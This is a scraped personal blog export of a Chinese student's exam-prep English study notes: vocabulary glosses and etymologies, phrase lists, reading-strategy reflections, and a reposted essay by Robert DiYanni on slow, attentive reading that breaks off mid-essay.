<p><img src="https://ckcah.github.io/images/english/image-20210808200513073.png" alt="image-20210808200513073"></p>
<p><img src="https://ckcah.github.io/images/english/image-20210808200642257.png" alt="image-20210808200642257"></p>
<p>行为？还有一个是什么</p>
<p><img src="https://ckcah.github.io/images/english/image-20210808200545491.png" alt="image-20210808200545491"></p>
<h2 id="amount-数量"><a href="#amount-数量" class="headerlink" title="amount 数量"></a>amount 数量</h2><p>金额</p>
<p><img src="https://ckcah.github.io/images/english/image-20210808201354703.png" alt="image-20210808201354703"></p>
<h2 id="against-反对"><a href="#against-反对" class="headerlink" title="against 反对"></a>against 反对</h2><p>应对</p>
<h2 id="look-at看"><a href="#look-at看" class="headerlink" title="look at看"></a>look at看</h2><p>考虑</p>
<h2 id="generous"><a href="#generous" class="headerlink" title="generous"></a>generous</h2><p>慷慨的（倾向好）</p>
<h2 id="spending-开支"><a href="#spending-开支" class="headerlink" title="spending 开支"></a>spending 开支</h2><p>开支是指浪费还是正常的开支？</p>
<h2 id="but-但是、而是"><a href="#but-但是、而是" class="headerlink" title="but 但是、而是"></a>but 但是、而是</h2><p>可表强调</p>
<p><img src="https://ckcah.github.io/images/english/image-20210809123852588.png" alt="image-20210809123852588"></p>
<p><img src="https://ckcah.github.io/images/english/image-20210809123929861.png" alt="image-20210809123929861"></p>
<p>这里我其实不是很确定，但是我觉得是表强调是取决于男人</p>
<p>可表转折</p>
<h2 id="subjects-主题"><a href="#subjects-主题" class="headerlink" title="subjects 主题"></a>subjects 主题</h2><p> <em>Subject</em> can also mean beholden, or subordinate. If you are traveling in England, but not an English subject, or citizen, then you are still subject to English law.</p>
<p>作主语时还可以表示受惠者，下属</p>
<h2 id="doctor-医生、篡改"><a href="#doctor-医生、篡改" class="headerlink" title="doctor 医生、篡改"></a>doctor 医生、篡改</h2><p>But beware, there’s also a market out there for doctored, or tampered-with diplomas, where you can buy a fake degree to call yourself a doctor.</p>
<h2 id="without-a-net"><a href="#without-a-net" class="headerlink" title="without a net"></a>without a net</h2><p>我更愿意把他理解成，在没有某种约定，设定的情况下</p>
<p>一般用在，即将去做一件没有退路的事情的时候</p>
<h2 id="a-is-a-go"><a href="#a-is-a-go" class="headerlink" title="a is a go"></a>a is a go</h2><h2 id="lead-to"><a href="#lead-to" class="headerlink" title="lead to"></a>lead to</h2><p>指向最后的结果，不一定要翻译成导致、、、</p>
<p>只要表现出最后怎么了就可以了，表明最后的结果情况</p>
<p><img src="https://ckcah.github.io/images/english/image-20210818195810718.png" alt="image-20210818195810718"></p>
<h2 id="precisely-恰恰、刚刚好"><a href="#precisely-恰恰、刚刚好" class="headerlink" title="precisely 恰恰、刚刚好"></a>precisely 恰恰、刚刚好</h2><p>The adverb <em>precisely</em> describes something done with complete accuracy or perfection.</p>
<h2 id="order秩序"><a href="#order秩序" class="headerlink" title="order秩序"></a>order秩序</h2><p>An order is also a group, like the Freemasons or the Order of St. Benedict.</p>
<p>表订单</p>
<h2 id="lasting-持久的"><a href="#lasting-持久的" class="headerlink" title="lasting 持久的"></a>lasting 持久的</h2><p>If something is <em>lasting</em>, it sticks around for a very long time.</p>
<h2 id="seeing"><a href="#seeing" class="headerlink" title="seeing"></a>seeing</h2><p>预示未来会怎么样</p>
<p><img src="https://ckcah.github.io/images/english/image-20210824184139168.png" alt="image-20210824184139168"></p>
<h2 id="should"><a href="#should" class="headerlink" title="should"></a>should</h2><p>有时也表惊讶，翻译为   竟然</p>
<h2 id="if-如果"><a href="#if-如果" class="headerlink" title="if 如果"></a>if 如果</h2><p>表示虚拟的语气</p>
<p>可翻译为哪怕，就算，</p>
<p>表示怀疑</p>
<p>/1. To many males Brandon’s life might seem pretty attractive, <strong>if only as</strong> a source of fantasy.</p>
<p>/2. Wentworth makes the cut, <strong>if only as</strong> a souvenir of that magical cycling tour.</p>
<p>/3. This makes sense, <strong>if only as</strong> a modern version of an ancient poetic theory.</p>
<p>if only as 哪怕</p>
<p>if just as 即使</p>
<h2 id="such-如此"><a href="#such-如此" class="headerlink" title="such 如此"></a>such 如此</h2><p>此类</p>
<p>一类</p>
<h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>也可表 <em><strong>赞成</strong></em></p>
<p>From late Old English as “in favor of.” <em>For</em> and <em>fore</em> differentiated gradually in Middle English. <em>For</em> alone as a conjunction, “because, since, for the reason that; in order that” is from late Old English, probably a shortening of common Old English phrases such as <em>for þon þy</em> “therefore,” literally “for the (reason) that.”</p>
<h2 id="seeing-1"><a href="#seeing-1" class="headerlink" title="seeing"></a>seeing</h2><p>一般都指未来会、、、、</p>
<p>预示未来</p>
<h2 id="just"><a href="#just" class="headerlink" title="just"></a>just</h2><p>From c. 1400 as “right-minded, good in intention;” from early 15c. as “legal, lawful, right in law.” Also “exact, precise; marked or characterized by precision; having correct dimensions” (late 14c.); of narrations, calculations, etc., “accurate, correct” (early 15c.). The sense in music, “harmonically pure, correct, and exact” is by 1850.</p>
<h2 id="besides"><a href="#besides" class="headerlink" title="besides"></a>besides</h2><p>除此之外，包括在内。</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>reporting phrase 间接引用</p>
<p>indirect method 间接方式</p>
<p>accroding to 直接引用</p>
<h2 id="allows-you-to"><a href="#allows-you-to" class="headerlink" title="allows you to"></a>allows you to</h2><p>让人得到。。。</p>
<p>allow在词根中，就有<em><strong>得到、获得</strong></em>的意思</p>
<h2 id="be-anything-less-than"><a href="#be-anything-less-than" class="headerlink" title="be anything less than"></a>be anything less than</h2><p>No one says that the N.H.L. <strong>is anything less than</strong> the world’s top league.什么都比不上</p>
<h2 id="provoke"><a href="#provoke" class="headerlink" title="provoke"></a>provoke</h2><p>常用意思：挑衅</p>
<p><em><strong>被激起</strong></em>：</p>
<p><img src="https://ckcah.github.io/images/english/image-20210918140310225.png" alt="image-20210918140310225"></p>
<h2 id="gaping"><a href="#gaping" class="headerlink" title="gaping"></a>gaping</h2><p>原译：张开</p>
<p>gaping hole巨大的孔</p>
<h2 id="amount"><a href="#amount" class="headerlink" title="amount"></a>amount</h2><p>“to go up, rise, mount (a horse),”</p>
<p>Meaning <em><strong>“to rise in number or quality (so as to reach)”</strong></em> is from c. 1300.</p>
<h2 id="purpose"><a href="#purpose" class="headerlink" title="purpose"></a>purpose</h2><p>“forth” (from a variant of Latin <em>pro-</em> <em><strong>“forth;”</strong></em> see <a href="https://www.etymonline.com/word/pur-?ref=etymonline_crossreference">pur-</a>) + Old French <em>poser</em> <em><strong>“to put, place”</strong></em> (see <a href="https://www.etymonline.com/word/pose?ref=etymonline_crossreference#etymonline_v_18512">pose</a> (v.1))</p>
<h2 id="appreciate-v"><a href="#appreciate-v" class="headerlink" title="appreciate (v.)"></a>appreciate (v.)</h2><p>1650s, “to esteem or value highly,” from Late Latin <em>appretiatus</em>, past participle of <em>appretiare</em> “to set a price to,” from <em>ad</em> “to” (see <a href="https://www.etymonline.com/word/ad-?ref=etymonline_crossreference">ad-</a>) + <em>pretium</em> “price” (see <a href="https://www.etymonline.com/word/price?ref=etymonline_crossreference#etymonline_v_19493">price</a> (n.)). Meaning <em><strong>“to rise in value”</strong></em> (intransitive) is by 1787; </p>
<h2 id="embarrass"><a href="#embarrass" class="headerlink" title="embarrass"></a>embarrass</h2><p>阻碍、尴尬</p>
<h2 id="scandal"><a href="#scandal" class="headerlink" title="scandal"></a>scandal</h2><p>丑闻</p>
<h2 id="crisis"><a href="#crisis" class="headerlink" title="crisis"></a>crisis</h2><p>early 15c., <em>crise, crisis</em>, “decisive point in the progress of a disease,” also “<em><strong>vitally important or decisive state of things, point at which change must come, for better or worse,</strong></em>“ from Latinized form of Greek <em>krisis</em> “<em><strong>turning point in a disease, that change which indicates recovery or death</strong></em>“ (used as such by Hippocrates and Galen), <em><strong>literally “judgment, result of a trial, selection,”</strong></em> from <em>krinein</em> “to separate, decide, judge,” from PIE root <a href="https://www.etymonline.com/word/*krei-?ref=etymonline_crossreference">*krei-</a> “to sieve,” thus “discriminate, distinguish.”</p>
<h2 id="magnificent"><a href="#magnificent" class="headerlink" title="magnificent"></a>magnificent</h2><p> from <em>magnus</em> “great” (from PIE root <a href="https://www.etymonline.com/word/*meg-?ref=etymonline_crossreference">*meg-</a> “great”) + combining form of <em>facere</em> “to make” (from PIE root <a href="https://www.etymonline.com/word/*dhe-?ref=etymonline_crossreference">*dhe-</a> “to set, put”). Meaning “characterized by grandeur or stateliness</p>
<h2 id="transcendence"><a href="#transcendence" class="headerlink" title="transcendence"></a>transcendence</h2><p><em><strong>origin</strong></em>:transcend (v.)</p>
<p>mid-14c., “escape inclusion in; lie beyond the scope of,” from Old French <em>transcendre</em> “transcend, surpass,” and directly from Latin <em>transcendere</em> “climb over or beyond, surmount, overstep,” from <em>trans</em> “across, beyond” (see <em><strong>trans-</strong></em> + <em>scandere</em> “to climb” (see <em><strong>scan</strong></em> (v.)). Meanings “be surpassing, outdo, excel; surmount, move beyond” are from early 15c. Related: <em>Transcended</em>; <em>transcending</em>.</p>
<h2 id="appear"><a href="#appear" class="headerlink" title="appear"></a>appear</h2><p>from Latin <em>apparere</em> “to appear, come in sight, make an appearance,” from <em>ad</em> “to” (see <em><strong>ad-</strong></em>) + <em>parere</em> “to come forth, <strong>be visible</strong>; submit, obey,” which is of uncertain origin; de Vaan says from a PIE *<em>prh-o-</em> “providing.” Of persons, “present oneself,” late 14c. Meaning “seem, have a certain appearance” is late 14c.</p>
<h2 id="rival"><a href="#rival" class="headerlink" title="rival"></a>rival</h2><p>1570s, <em><strong>“one who is in pursuit of the same object as another;”</strong></em> 1640s, “one who emulates or strives to equal or exceed another” in some way; from Latin <em>rivalis</em> “a rival, adversary in love; neighbor,” originally, “of the same brook,” from <em><strong>rivus</strong></em> “brook” (from PIE root <a href="https://www.etymonline.com/word/*rei-?ref=etymonline_crossreference">*rei-</a> “to run, flow”).</p>
<h2 id="biography"><a href="#biography" class="headerlink" title="biography"></a>biography</h2><p>from Greek <em><strong>bios</strong></em> “life” (from PIE root <a href="https://www.etymonline.com/word/*gwei-?ref=etymonline_crossreference">*gwei-</a> “to live”) + <em><strong>graphia</strong></em> “record, account” (see <a href="https://www.etymonline.com/word/-graphy?ref=etymonline_crossreference">-graphy</a>).</p>
<h2 id="exhaustion"><a href="#exhaustion" class="headerlink" title="exhaustion"></a>exhaustion</h2><p>1530s, “to draw off or out, to use up completely,” from Latin <em>exhaustus</em>, past participle of <em>exhaurire</em> “draw off, take away, use up, empty,” from <em>ex</em> “off” (see <a href="https://www.etymonline.com/word/ex-?ref=etymonline_crossreference">ex-</a>) + <em>haurire</em> “to draw up” (as water), from PIE *<em>heusio-</em> “to scoop.” Meaning “make weak or helpless, as by fatigue” is from 1630s.</p>
<h2 id="premonition"><a href="#premonition" class="headerlink" title="premonition"></a>premonition</h2><p>from <em>prae</em> “before” (see <a href="https://www.etymonline.com/word/pre-?ref=etymonline_crossreference">pre-</a>) + <em>monere</em> “to admonish, warn, advise,” from PIE *<em>moneie-</em> “to make think of, remind,” </p>
<h2 id="integrity"><a href="#integrity" class="headerlink" title="integrity"></a>integrity</h2><p>c. 1400, <em>integrite</em>, “innocence, blamelessness; chastity, purity,” from Old French <em>integrité</em> and directly from Latin <em>integritatem</em> (nominative <em>integritas</em>) “soundness, wholeness, completeness,” figuratively <em><strong>“purity, correctness, blamelessness,”</strong></em> from <em>integer</em> “whole” (see <a href="https://www.etymonline.com/word/integer?ref=etymonline_crossreference">integer</a>).</p>
<h1 id="搭配，用法"><a href="#搭配，用法" class="headerlink" title="搭配，用法"></a>搭配，用法</h1><ol>
<li><p>the fact that she never inquired how the stories <em><strong>arrived</strong></em>.</p>
</li>
<li><p><em><strong>well-</strong></em> paid 高薪</p>
</li>
<li><p>rather than dieting <em><strong>their way to</strong></em> size zero or wasp-waist physiques ．而不是通过节食来达到零码或黄蜂腰身形</p>
</li>
<li><p>it’s <em><strong>just</strong></em> not fair.  这实在是不公平</p>
</li>
<li><p>His concern is mainly with the humanities: literature, languages, philosophy <em><strong>and so on</strong></em>之类的等等一系列</p>
</li>
<li><p>Equally unsurprisingly, only about half <em><strong>end up with</strong></em> professorships for which they entered graduate school.最终获得</p>
</li>
<li><p>thesis-writing 论文写作</p>
</li>
<li><p>in just a tenth of a second 在1/10秒内            a second 一秒钟</p>
</li>
<li><p>come up with  提出</p>
</li>
<li><p>stems from 源于</p>
</li>
<li><p>in a move that在一次行动中</p>
</li>
<li><p>in the wake of 随着</p>
</li>
<li><p><em><strong>the turn of</strong></em> 20th century 20世纪初</p>
</li>
<li><p><em><strong>the eve of</strong></em> World War II 二战前夕</p>
</li>
<li><p>to the point of = to the degree = to a stage 到了。。。的地步</p>
</li>
<li><p>even those reviewers who <em><strong>wore their learning lightly</strong></em> 甚至是那些喜欢卖弄学问的评论家们</p>
</li>
<li><p>I am tempted to define ‘journalism’ as ‘a term of contempt applied by writers who are not read to writers who are.</p>
</li>
</ol>
<p>我很想将‘新闻业’定义为‘一个不被读过的作家对读过的作家的蔑视术语。’</p>
<ol start="18">
<li>save to 除了</li>
<li>it turn out that 事实证明</li>
<li>in several instance 在几种情况下</li>
<li>on the whole 总体上</li>
<li>To a certain extent 在某种程度上</li>
<li>is hardly the only 并不是唯一的</li>
<li>a piece of cake 小菜一碟</li>
<li>no shock there 不要惊讶</li>
<li>play a major role 起主要作用</li>
<li>a broad range of范围广泛的</li>
<li>promote complementary 促进互补</li>
<li>vague excuses 模糊的借口</li>
<li>the first signs of 最初的迹象</li>
<li>to be between jobs 失业</li>
<li>wing by wing 一个接一个</li>
<li>in return for 作为回报</li>
<li>it’s not yet clear 尚不清楚</li>
<li>fatal flaw 致命缺陷</li>
<li>couldn’t be more out of date</li>
<li>more precisely 更准确地</li>
<li>In the past couple of weeks 在过去几周</li>
<li>Human nature being what it is 人类本来就是这样</li>
<li>It is not yet clear 目前还不清楚</li>
<li>after all 毕竟</li>
<li>our visions of future 未来愿景</li>
<li>Up until a few decades ago 直到十几年前</li>
<li>writing on the wall  厄运当头</li>
<li>a state of exhaustion 精疲力竭的状态</li>
<li>sets out to correct 着手纠正</li>
<li>It is difficult to the point of impossibility for 很难（难到不可能的地步）</li>
<li>it was taken for granted that 人们理所当然的认为</li>
<li>perched on top 居高临下</li>
<li>to put it in layman’s terms</li>
<li>it was lucky <em><strong>indeed</strong></em> there were no injuries</li>
<li>it is disturbing that 令人警惕的是</li>
<li>oversight panel</li>
<li>to the contrary 相反的是</li>
<li>own board of directors 董事会</li>
<li>the fallout from 后果是</li>
<li>it remains unclear 仍然不清楚</li>
<li> shift away 转变</li>
</ol>
<h1 id="特殊句式"><a href="#特殊句式" class="headerlink" title="特殊句式"></a>特殊句式</h1><p>The company is blamed for <em><strong>sucking sales out of Britain’s high streets</strong></em> and <em><strong>threatening to automate workers out of existence.</strong></em></p>
<p>该公司被指责从英国的大街上吸走销售，并威胁要让工人自动化。</p>
<p>It says more about the decrepit state of the care sector <em><strong>than Amazon’s warehouses that workers are choosing the latter over the former.</strong></em></p>
<p>相比亚马逊的仓库，工人选择后者而不是前者，更能说明护理行业的破旧状态。</p>
<p><code>Bluntly it had no clue how prevalent the wheel defect mightbe, nor how frequent inspections would have to be to detect it.</code></p>
<p>坦率地说，它不知道车轮缺陷可能有多普遍，也不知道需要多频繁的检查才能发现它</p>
<p><code>What else don ’ t we know about Metro safety issues?</code></p>
<p>关于地铁安全问题，我们还有什么不知道的？</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>英语</category>
        <category>随记</category>
        <category>有趣的新发现</category>
      </categories>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>英语词源故事集锦</title>
    <url>/2021/08/02/%E8%8B%B1%E8%AF%AD%E8%AF%8D%E6%BA%90%E6%95%85%E4%BA%8B%E9%9B%86%E9%94%A6/</url>
    <content><![CDATA[<object data="https://ckcah.github.io/books/英语词源故事集锦.pdf" type="application/pdf" width="100%" height="980px">

</object><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
      </categories>
      <tags>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>著名绿眼逻辑谜题</title>
    <url>/2020/05/10/%E8%91%97%E5%90%8D%E7%BB%BF%E7%9C%BC%E9%80%BB%E8%BE%91%E8%B0%9C%E9%A2%98/</url>
    <content><![CDATA[<p><strong>keyword：多读书多看报，少吃零食多睡觉</strong></p>
<span id="more"></span> 

<iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV19f4y1m7Mp" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>英语</category>
        <category>扩展读物</category>
        <category>反省</category>
        <category>TED</category>
      </categories>
      <tags>
        <tag>思考</tag>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>词汇回顾</title>
    <url>/2021/08/06/%E8%AF%8D%E6%B1%87%E5%9B%9E%E9%A1%BE/</url>
    <content><![CDATA[<ul>
<li>count on</li>
</ul>
<p>依赖、指望</p>
<ul>
<li>the side effect</li>
</ul>
<p>副作用</p>
<ul>
<li>in time of</li>
</ul>
<p>在。。。时间</p>
<ul>
<li>go into</li>
</ul>
<p>进入</p>
<ul>
<li>be make up with</li>
</ul>
<p>弥补</p>
<p>个人理解：是。。。上去 -&gt; 弥补</p>
<ul>
<li>borne</li>
</ul>
<p>承担</p>
<ul>
<li>deductibles</li>
</ul>
<p>免赔额</p>
<ul>
<li>the odds of </li>
</ul>
<p>。。的几率</p>
<p>odd 赔率</p>
<ul>
<li>get back alive </li>
</ul>
<p>活过来了、劫后余生</p>
<ul>
<li>四个形容词在前面修饰名词做搭配：</li>
</ul>
<p>作者刻意为之，是为了表明、描述细节</p>
<ul>
<li>fashion 时髦</li>
</ul>
<p>To fashion something means to built it, </p>
<p>as in “We fashioned a shelter out of rocks and mud.” But that kind of fashioning probably isn’t in fashion these days.</p>
<ul>
<li><p>check 检查</p>
<p>A few of the many meanings of <em>check:</em> As a noun: the act of restraining power or action</p>
</li>
</ul>
<ul>
<li><p>to say the least</p>
<p>至少来说</p>
</li>
<li><p>at last</p>
<p>终于</p>
<p>free(v.) at last     终于自由了</p>
<p>progress(n.) at last        最后的进展</p>
</li>
<li><p>straight up </p>
<p>直截了当</p>
</li>
<li><p>cloak</p>
<p>伪装</p>
</li>
<li><p>vague</p>
<p>模糊的</p>
</li>
<li><p>by no means uniformly</p>
<p>绝不是均匀的</p>
</li>
<li></li>
</ul>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>英语</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>陈兔兔阅读专项班-截至16text2 总结</title>
    <url>/2021/08/02/%E9%99%88%E5%85%94%E5%85%94%E8%80%81%E5%B8%88%E9%98%85%E8%AF%BB%E4%B8%93%E9%A1%B9%E7%8F%AD-%E6%88%AA%E8%87%B316text2-%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="杂论"><a href="#杂论" class="headerlink" title="杂论"></a>杂论</h3><p>单词、短语的替换（作者、出题人经常干的事）   我却经常忘记的事</p>
<p>强调句                句型                介词                时态</p>
<p>段与段之间的关系（最好是每读一段就分析一段）（主旨段、支持段 正反例？）</p>
<p>具体 -&gt; 概括                        概括  -&gt;  具体</p>
<p>长难句一定要去分析主语、造成的后果、包含了什么</p>
<p>从概括到具体（一般具体为关注点）</p>
<p>写作思路：从概括到具体、例证（一般为关注点）</p>
<p>单词也存在首尾呼应</p>
<p>每一段找主旨句</p>
<p>转折（but。。。）：1.表强调</p>
<p>​                                        2.表反对</p>
<p>主旨句回看</p>
<p>不同角色的对比（行为、表面）：一般最不同的那个就是出题点</p>
<p>如何理解主题句和支持句的关系：</p>
<p>主题句为主</p>
<p>支持句也要看，支持手段只是为了让你更深理解（会作为选项迷惑学生）学会透过例子看主旨</p>
<p>支持手段：引用、数据、例子</p>
<p>对比：1.不同之处</p>
<p>​            2.相同之处</p>
<p>类比</p>
<p>出题人更倾向于考新的（当新旧同时出现时）</p>
<p>今昔对比</p>
<p>看完第1段（总结）、第2段后，看第1段重要的事情在第2段中提到了几个，若没说完，则下一段极大可能就是另一个点</p>
<p>（猜测下一段主旨）</p>
<p>句子中可能存在暗示（作者的态度、倾向）（透过现象看本质）（词性的“好坏”）</p>
<p>段研究局限性</p>
<p>后一段的第一句有可能是上一段的总结（明示）</p>
<p>避免就题讲题（看根源）</p>
<p>文章首先出现带有“冲突”色彩的单词，带着“是什么冲突”问题往下读，寻找答案</p>
<p>段的关系：        立论    -&gt;    驳论</p>
<p><em>（我可能脑子不太好，不能表达我想说的）</em></p>
<p>无法说清的思想：</p>
<p>16 text2中：</p>
<p>在乡村盖房   =    破坏农村</p>
<p>在乡村盖房 不是对城市存在偏见，反而是为了保护城市特点特色</p>
<h3 id="出题人"><a href="#出题人" class="headerlink" title="出题人"></a>出题人</h3><p>1.拼凑</p>
<p>2.正话反说</p>
<p>3.将支持句作为选项之一进行迷惑</p>
<p>4.时间上的对比</p>
<p>5.正确选项中如果有删除单词或短语，但如果未影响到文章主旨，可忽略</p>
<p>6.替换词组</p>
<p>7.考研文章有些是出题人将外刊原文进行删减后作为考研题目</p>
<p>8.出题人不可能在同一个地方出题，但可能在同一句话出题</p>
<h3 id="作者经常行为"><a href="#作者经常行为" class="headerlink" title="作者经常行为"></a>作者经常行为</h3><p>替换词组</p>
<p>先赞成对方观点，然后提出质疑（引用科学报告。。。。），然后说不对，最后提出自己观点</p>
<h3 id="自我总结"><a href="#自我总结" class="headerlink" title="自我总结"></a>自我总结</h3><p>1.长难句分析太慢，经常忘记看主、所造成的结果、有什么、指的什么</p>
<p>2.自己真题解析式，找到原文进行参考思考（出题人删了什么、为什么删）</p>
<p>3.注意形容词、动词的情绪（关乎作者态度）</p>
<p>4.注意作者在举例时，句子中出现的，like、as well。。。。。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>英语</category>
        <category>陈仲凯老师</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>How to gain more from your reading</title>
    <url>/2021/08/07/How-to-gain-more-from-your-reading/</url>
    <content><![CDATA[<p> <strong>keyword：这是一位学者的原文，我只是互联网的搬运工</strong></p>
<p>There’s more to words than meets the eye. Deepen your appreciation of literature through the art of slow, attentive reading</p>
<p>by Robert DiYanni</p>
<p><em>Still life with Book</em> (detail, 1913) Juan Gris. <em>Courtesy Musée d’Art Moderne de la Ville de Paris, Paris, France</em></p>
<p>Robert DiYanniis a professor of humanities at New York University. His latest books are <a href="https://www.wiley.com/en-us/Critical+Reading+Across+the+Curriculum%3A+Humanities%2C+Volume+1-p-9781119154891"><em>Critical Reading Across the Curriculum</em></a> (2017), co-written with Anton Borst, and <a href="https://press.princeton.edu/books/hardcover/9780691206783/you-are-what-you-read"><em>You Are What You Read: A Practical Guide to Reading Well</em></a> (2021). He lives in Bedford, New York.</p>
<h2 id="Need-to-know"><a href="#Need-to-know" class="headerlink" title="Need to know"></a>Need to know</h2><p>Have you ever wondered how some people see so much in what they read – whether they’re reading novels or stories, poems or plays, essays or memoirs, or something entirely different? One of the pleasures of reading literature well is the satisfaction of being tuned in to what a literary work shows and suggests – and to how it does those things. You probably already enjoy the ways that literary works entertain you, instruct you, move you. Recognising and understanding how they accomplish these things will enable you to deepen your appreciation still further and gain even more reward.</p>
<p>From reading deeply, you gain experience as well as knowledge: you gain from reading literary works in all their unique particularity. You live other lives, undergo other ways of being in the world that, while differing from your own, speak, nonetheless, to your condition and that of the people around you. In the process of reading literature, we therefore enrich our understanding of other people and of the world – and of ourselves. We become, in some sense, what we read.</p>
<p>You might wonder how to increase your enjoyment of literary works, how you might amplify literature’s value, and savour more fully the pleasures of language and form, of idea and insight that works of literature offer. In the following villanelle, I suggest how you might begin.</p>
<blockquote>
<p><strong>The Art of Reading</strong></p>
</blockquote>
<blockquote>
<p>The art of reading isn’t hard to master,<br>some say. But I say <em>au contraire</em>; not so.<br>It is no small achievement to read well,</p>
</blockquote>
<blockquote>
<p>with intense absorption in the text.<br>It requires attention and discernment.<br>The art of reading takes effort to master.</p>
</blockquote>
<blockquote>
<p>It requires reading many kinds of works,<br>some easy, some more difficult.<br>To read good books and read them truly well</p>
</blockquote>
<blockquote>
<p>with skill and confidence, with ease and grace<br>deepens understanding, makes one wise.<br>To learn the art of reading – to become a master –</p>
</blockquote>
<blockquote>
<p>read widely and deeply, re-read and read aloud,<br>make observations, ask questions of what you read.<br>It’s no small gain to read supremely well.</p>
</blockquote>
<blockquote>
<p>It’s a skill for lifelong learning pleasure.<br>Read for fun as well as learning – for delight.<br>The art of reading takes some time to master,<br>in pixels or in print. Go slow. Enjoy. Read well.</p>
</blockquote>
<p>NEED TO KNOWWHAT TO DOKEY POINTSLEARN MORELINKS &amp; BOOKS</p>
<h2 id="What-to-do"><a href="#What-to-do" class="headerlink" title="What to do"></a>What to do</h2><p>To reap the benefits of reading literature with greater pleasure and appreciation, here are some of the most important things you can do:</p>
<p><strong>Pay close attention and question what you’re reading</strong></p>
<p>Reading with insight and toward deeper understanding requires paying close attention, noticing as much as you can about the text from the beginning. Attending to a work carefully will prepare you to reflect on it, engage with it and ask questions. That’s the key – bring to bear your attentive, observant, questioning self on your reading.</p>
<p>Consider the opening sentence of Leo Tolstoy’s great novel <em>Anna Karenina</em> (1877), in its acclaimed 2000 translation by Richard Pevear and Larissa Volokhonsky: ‘All happy families are alike; each unhappy family is unhappy in its own way.’</p>
<p>What you might notice about this sentence first, perhaps, is its parallel structure. Tolstoy’s line balances and contrasts happy families with unhappy ones. It asserts that they differ in how they experience happiness and unhappiness.</p>
<p>OK. So that’s what Tolstoy posits as he launches his 800-page novel. He sets up an early expectation that his book will be about families, some happy and some unhappy. We need to read the book, of course, to find out what their happiness and unhappiness consists of, and how they became happy and unhappy families along the way.</p>
<p>In reflecting on Tolstoy’s sentence, your thinking might take the form of questioning its assertion. You might qualify it, or perhaps hold in abeyance your agreement or disagreement. You might even imagine a reversal of what the sentence says, revising it this way: ‘All unhappy families are alike; each happy family is happy in its own way.’ Your careful observations about Tolstoy’s sentence will lead to questions, which will lead to reflection, which illustrates how you can engage actively with a writer’s work.</p>
<p><strong>Read, and then read again</strong></p>
<p>Reading with understanding, appreciation and pleasure requires <em>re-reading</em>. Why is this so? Re-reading is critical because there are so many things going on in a work of literature that you can’t grasp them all in a single reading – no one can. You need time to notice and reflect; to revisit and re-see what’s there, to ensure that what you observed in your preliminary excursion through an essay or poem or story is indeed there. And you need an opportunity to see what you might have missed. In your second and subsequent traversals of a work, you’ll notice more, question more, think more, understand more, and in the process deepen your reading pleasure.</p>
<p>Consider this brief two-line poem by Robert Frost:</p>
<blockquote>
<p><strong>The Span of Life (1936)</strong></p>
</blockquote>
<blockquote>
<p>The old dog barks backward without getting up.<br>I can remember when he was a pup.</p>
</blockquote>
<p>What do you notice on a quick first reading of these lines? Perhaps that they rhyme; Frost’s poem is a couplet. Next, that the poem describes a dog; in the present, an old dog. Seeing his ageing canine companion, the speaker remembers when he was a little pup. That’s it. There’s nothing more to it. Right?</p>
